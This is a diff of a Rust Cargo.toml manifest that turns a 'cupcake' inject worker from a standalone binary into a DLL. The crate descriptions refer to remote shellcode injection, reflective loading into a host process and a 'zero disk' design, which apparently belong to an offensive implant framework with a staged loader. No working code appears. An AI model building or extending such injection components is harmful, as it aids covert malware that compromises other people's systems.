@@ -1,12 +1,13 @@
 [package]
-name = "cupcake-inject-worker"
+name = "cupcake-mod-inject"
 version = "0.1.0"
 edition = "2021"
-description = "Sacrificial L2 inject worker PE — remote shellcode from a short-lived process (on-demand only)"
+description = "Sacrificial L2 inject worker DLL — reflective load into host process (zero disk)"
 
-[[bin]]
-name = "cupcake-inject-worker"
-path = "src/main.rs"
+[lib]
+name = "cupcake_mod_inject"
+path = "src/lib.rs"
+crate-type = ["cdylib"]
 
 [dependencies]
 # Only inject surface from core — no transport / Stage0 monolith
